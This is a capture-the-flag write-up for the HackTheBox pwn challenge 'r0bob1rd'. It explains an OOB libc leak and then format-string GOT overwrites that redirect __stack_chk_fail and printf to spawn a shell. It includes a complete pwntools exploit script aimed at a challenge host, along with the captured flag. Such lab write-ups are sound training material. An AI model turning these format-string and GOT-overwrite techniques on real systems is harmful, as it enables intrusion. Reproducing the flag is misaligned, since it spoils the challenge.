---
title: "r0bob1rd"
ctf: "HackTheBox"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
---

# r0bob1rd

## Summary

Three-chained vuls in a robobird management binary: OOB array read leaks libc, format string overwrites GOT entries, and an off-by-two overflow triggers `__stack_chk_fail` which is redirected to create an execution loop.

## Solution

### Stage 0: Libc leak via OOB read

`robobirdNames` at `0x6020a0` is an array of `char*` pointers. Index `-16` reads `*(0x6020a0 - 128) = *(0x602020)`, which is `puts@GOT`. The libc `puts` address leaks out as a byte string.

### Stage 1: Overwrite `__stack_chk_fail@GOT` → `operation()`

A manual format string using `%hn` overwrites the low 2 bytes of `__stack_chk_fail@GOT` from the PLT stub (`0x400786` → `0x400aca`). The 105-byte `fgets` input corrupts the stack canary, triggering `__stack_chk_fail` → `operation()`, creating a loop.

### Stage 2: Overwrite `printf@GOT` → `system()`

In the looped operation, a second format string overwrites `printf@GOT` with `system()` using 3×`%hn` (short writes for bytes 0-5) + 1×`%hhn` (byte 7 fix, 0x7f→0x00).

### Stage 3: Shell

In the third operation, all `printf` calls are now `system()` calls. Sending `"sh\0"` padded to 105 bytes as the description triggers `system("sh")`, which starts an interactive shell.

```python
from pwn import *
import sys, time

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './r0bob1rd'
LIBC_PATH = './glibc/libc.so.6'
REMOTE_HOST = '154.57.164.71'
REMOTE_PORT = 30673

libc = ELF(LIBC_PATH, checksec=False)

GOT_STACK_CHK = 0x602028
GOT_PRINTF = 0x602030
OPERATION = 0x400aca

mode = 'remote' if '--remote' in sys.argv else 'local'
if mode == 'remote':
    p = remote(REMOTE_HOST, REMOTE_PORT)
else:
    p = process(BINARY, env={'LD_LIBRARY_PATH': './glibc/'})

def drain(t=2):
    time.sleep(t)
    try:
        while True:
            d = p.recv(timeout=1)
            if not d:
                break
    except:
        pass

p.recvuntil(b'R0bob1rd > ')
p.sendline(b'-16')
p.recvuntil(b'chosen: ')
leak = p.recvuntil(b'\n', drop=True)
puts_addr = u64(leak.ljust(8, b'\x00')[:8])
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']

log.info(f'system @ {hex(system_addr)}')

# Stage 1: __stack_chk_fail -> operation
fmt1 = b'%2762c%10$hn'
payload1 = fmt1.ljust(16, b'A') + p64(GOT_STACK_CHK)
payload1 = payload1.ljust(105, b'A')
p.sendlineafter(b'> ', payload1)
drain(3)
p.recvuntil(b'R0bob1rd > ', timeout=10)

# Stage 2: printf -> system
sysb = p64(system_addr)
writes = [
    (0x602034, u16(sysb[4:6])),
    (0x602032, u16(sysb[2:4])),
    (0x602030, u16(sysb[0:2])),
    (0x602037, 0),
]
shorts = writes[:3]
shorts.sort(key=lambda x: x[1])
writes = shorts + [writes[3]]

for try_offset in [56, 64, 48]:
    arg_base = 8 + try_offset // 8
    fmt = b''
    count = 0
    for i, (addr, val) in enumerate(writes):
        mod = 256 if addr == 0x602037 else 0x10000
        need = (val - count) % mod
        if need == 0:
            need = mod
        if addr == 0x602037:
            fmt += f'%{need}c%{arg_base + i}$hhn'.encode()
        else:
            fmt += f'%{need}c%{arg_base + i}$hn'.encode()
        count = (count + need) % mod
    if len(fmt) <= try_offset:
        fmt += b'A' * (try_offset - len(fmt))
        for addr, _ in writes:
            fmt += p64(addr)
        break

payload2 = fmt.ljust(105, b'A')
p.sendline(b'0')
p.sendlineafter(b'> ', payload2)
drain(5)

# Stage 3: system("sh")
p.sendline(b'0')
time.sleep(1)
p.send(b'sh\x00' + b'A' * 102)
time.sleep(4)
p.sendline(b'id')
p.sendline(b'cat flag* 2>/dev/null')
time.sleep(1)
print(p.recv(timeout=3).decode(errors='replace'))
p.interactive()
```

## Flag

```
HTB{5d063a7b6233029c82f8b450af7f323e}
```
